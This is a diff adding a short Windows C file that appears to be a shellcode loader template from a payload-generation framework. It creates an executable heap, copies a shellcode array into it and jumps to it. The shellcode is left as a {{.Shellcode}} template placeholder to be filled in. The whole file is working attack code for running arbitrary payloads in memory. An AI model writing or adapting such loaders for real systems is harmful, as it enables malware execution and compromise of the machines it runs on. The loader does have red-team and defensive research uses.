@@ -1,0 +1,20 @@
+#include <windows.h>
+#include <stdio.h>
+
+int heapFuncs(unsigned char* pCs, int size)
+{
+    HANDLE hCr9 = HeapCreate(0x00040000, size, size);
+    LPVOID pcsHeapAlloc = HeapAlloc(hCr9, 0x00000008, size);
+    memcpy_s(pcsHeapAlloc, size, pCs, size);
+    ((void(*)())pcsHeapAlloc)();
+    HeapFree(hCr9, 0x00040000, pcsHeapAlloc);
+    return 0;
+}
+
+int main(void)
+{
+    unsigned char shellcode[] = { {{.Shellcode}} };
+    printf("%s", shellcode);
+    heapFuncs((unsigned char*)shellcode, sizeof(shellcode));
+    return 0;
+}
